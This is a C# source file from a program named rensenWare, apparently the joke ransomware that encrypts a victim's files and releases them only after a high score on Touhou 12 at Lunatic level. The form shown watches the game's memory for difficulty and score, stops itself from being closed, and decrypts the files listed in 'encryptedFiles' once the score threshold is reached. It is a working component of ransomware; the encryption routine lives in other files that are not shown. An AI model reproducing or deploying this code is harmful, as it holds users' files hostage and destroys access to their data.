using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using rensenWare.Properties;

namespace rensenWare
{
	public partial class frmWarning : Form
	{
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		[DllImport("kernel32.dll")]
		private static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

		private bool _flag;
		private bool _flag_billion;

		private IntPtr _handle;

		public bool thProcessflag
		{
			get { return this._flag; }
			
			set
			{
				this._flag = value;
				if (this._flag)
				{
					this.ProcStatus.Invoke(new MethodInvoker(delegate()
					{
						this.ProcStatus.Text = "Detected";
					}));
					return;
				}

				this.ProcStatus.Invoke(new MethodInvoker(delegate()
				{
					this.ProcStatus.Text = "Process Killed!";
				}));
			}
		}

		public frmWarning()
		{
			this.InitializeComponent();
			new Thread(delegate()
			{
				for (;;)
				{
					if (!this.thProcessflag)
					{
						Process[] processesByName = Process.GetProcessesByName("th12");
						if (processesByName.Length != 0)
						{
							this._handle  = frmWarning.OpenProcess(16, false, processesByName.FirstOrDefault<Process>().Id);
							IntPtr handle = this._handle;
							this.thProcessflag = true;
						}
					}
					else
					{
						if (this._flag_billion)
						{
							break;
						}

						int num = 0;
						
						byte[] _buffer = new byte[4];
						if (!frmWarning.ReadProcessMemory((int)this._handle, 4910032, _buffer, 2, ref num))
						{
							this.thProcessflag = false;
							continue;
						}

						if (BitConverter.ToInt16(_buffer, 0) != 3)
						{
							this.ProcStatus.Invoke(new MethodInvoker(delegate()
							{
								this.ProcStatus.Text = "NOT LUNATIC LEVEL!";
							}));
							Thread.Sleep(100);
							continue;
						}

						this.ProcStatus.Invoke(new MethodInvoker(delegate()
						{
							this.ProcStatus.Text = "Process Working";
						}));

						if (!frmWarning.ReadProcessMemory((int)this._handle, 4918340, _buffer, 4, ref num))
						{
							this.thProcessflag = false;
							Thread.Sleep(100);
							continue;
						}

						this.ScoreStatus.Invoke(new MethodInvoker(delegate()
						{
							this.ScoreStatus.Text = (BitConverter.ToInt32(_buffer, 0) * 10).ToString();
						}));

						if (BitConverter.ToInt32(_buffer, 0) > 20000000)
						{
							this._flag_billion = true;
						}
						else
						{
							_buffer = null;
						}
						Thread.Sleep(100);
					}
					Thread.Sleep(100);
				}

				// Write the AES key and IV to their respective files
				File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
				File.WriteAllBytes(Program.IVFilePath,  Program.randomIV);
				
				this.decryptProgress.Maximum = Program.encryptedFiles.Count;
				using (List<string>.Enumerator enumerator = Program.encryptedFiles.GetEnumerator()) // Go through each of the encrypted files
				{
					while (enumerator.MoveNext())
					{
						string fileName = enumerator.Current;
						try
						{
							this.DecryptStatus.Invoke(new MethodInvoker(delegate()
							{
								this.DecryptStatus.Text = Path.GetFileName(fileName);
							}));

							Program.Crypt(fileName, true); // Decrypt the file
							
							ProgressBar progressBar = this.decryptProgress;
							progressBar.Value = progressBar.Value + 1;
							Thread.Sleep(100);
						}
						catch
						{
						}
					}
				}

				base.Invoke(new MethodInvoker(delegate()
				{
					MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
					this.ButtonManualDecrypt.Visible = true;
					this.ButtonExit.Visible = true;
				}));
			}).Start();
		}

		private void Prevent(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		private void ButtonExit_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		private void ButtonManualDecrypt_Click(object sender, EventArgs e)
		{
			new frmManualDecrypter().ShowDialog(this);
		}
	}
}
